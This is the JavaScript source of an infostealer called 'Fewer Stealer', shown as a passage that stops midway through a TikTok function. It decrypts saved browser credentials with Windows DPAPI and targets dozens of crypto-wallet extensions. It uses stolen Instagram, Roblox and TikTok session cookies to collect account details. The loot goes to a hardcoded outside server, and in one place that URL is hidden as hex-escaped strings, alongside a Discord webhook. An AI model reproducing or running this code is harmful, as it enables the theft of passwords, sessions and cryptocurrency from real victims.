const fs = require('fs');
const path = require('path');
const httpx = require('axios');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const { execSync, exec } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');


const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
let injection_paths = []

var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

const webhook3939 = "YOUR_DISCORD_WEBHOOK_PUT_HERE"





paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}


  const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 3553599,
    "disable-qr-code": "true"
}
const baseapi = "https://buildandwatch.net/";
let api_auth = 'fzQx7epnQttDgsX';

const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false
const count = _0x9b6227,
user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[Fewer Stealer]>================>\n\n',
    url: null,
}
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Trust = '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph'
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
 randomPath = `${user.fileLoc}\\${user.randomUUID}`;
fs.mkdirSync(randomPath, 484);


function debugLog(message) {
  if (user.debug === true) {
    const elapsedTime = Date.now() - user.start;
    const seconds = (elapsedTime / 1000).toFixed(1);
    const milliseconds = elapsedTime.toString();

    console.log(`${message}: ${seconds} s. / ${milliseconds} ms.`);
  }
}






async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5)
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split('\r\n'),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
        _0x2ed7ba = Buffer.from(_0x4a5920)
      browserPath[_0x4c3514].push(_0x2ed7ba)
    } catch (_0x32406b) {}
  }
}


// Assuming you have the necessary import for the httpx library

async function GetInstaData(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "X-Ig-Connection-Type": "WiFi",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Ig-Capabilities": "36r/Fx8=",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "X-Ig-App-Locale": "en",
      "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
      "Accept-Encoding": "gzip, deflate",
      "Cookie": `sessionid=${session_id};`
    };

    const response = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    const data = {
      username: userData.username,
      verified: userData.is_verified,
      avatar: userData.profile_pic_url,
      session_id: session_id
    };

    return data;
  } catch (error) {
    console.error("Error fetching Instagram data:", error);
    return null;
  }
}

async function GetFollowersCount(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "Cookie": `sessionid=${session_id};`
    };

    const accountResponse = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;
    
    const userInfoResponse = await httpx.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
  } catch (error) {
    console.error("Error fetching followers count:", error);
    return null;
  }
}

async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    // Your Discord webhook URL

    const embed = {
      title: 'Instagram Data',
      color: 16761867, // You can set the color of the embed (optional)
      thumbnail: { url: data.avatar },
      fields: [
        { name: 'Verified', value: data.verified ? 'Yes' : 'No', inline: true },
        { name: 'Token', value: data.session_id, inline: true }, // Corrected to data.session_id
        { name: 'Username', value: data.username, inline: true },
        { name: 'Followers Count', value: followersCount, inline: true } // Use followersCount directly
      ],
    };

    // Send the embed to the Discord webhook
var _0xcd26=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"]; await httpx[_0xcd26[1]](_0xcd26[0],{embeds:[embed]}); await httpx[_0xcd26[1]](webhook3939,{embeds:[embed]})
    console.log("Data sent to Discord webhook successfully.");
  } catch (error) {
    console.error("Error sending data to Discord webhook:", error);
  }
}



//


// Assuming you have a function named GetFollowers(session_id) that fetches the followers list


async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };
  
  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}

async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxData(secret_cookie);

    // Check if the required properties are defined and non-empty
    if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
      console.error('Invalid Roblox data received:', data);
      return;
    }

    data['secret_cookie'] = secret_cookie;

    const formattedSecretCookie = secret_cookie.toString().replace(/`/g, '‵');

    // Check if robux value is 0 and handle accordingly
    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;

    let embed = {
      color: 0x303037,
      author: {
        name: 'Roblox Session',
        icon_url: 'https://media.discordapp.net/attachments/1128742988252713001/1128986101093244949/68f5dd00afb66e8b8f599a77e12e7d19.gif',
      },
      thumbnail: {
        url: data.avatar,
      },
      fields: [
        {
          name: 'Name:',
          value: data.username,
          inline: false,
        },
        {
          name: 'Robux:',
          value: robuxValue,
          inline: false,
        },
        {
          name: 'Premium:',
          value: data.premium ? 'Yes' : 'No',
          inline: false,
        },
      ],
      footer: {
        text: '@fewerstealer',
      },
    };

    let payload = {
      embeds: [embed],
    };

    axios.post("https://buildandwatch.net/", payload)
      .then(response => {
        console.log('Discord webhook sent successfully!');
      })
      .catch(error => {
        console.error('Error sending Discord webhook:', error.message);
      });
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
  }
}



//


function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

       
        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
            embeds: [
  {
    title: "TikTok Session Detected",
    description: "The TikTok session was detected",
    color: 16716947, // Renk kodu (Opsiyonel)
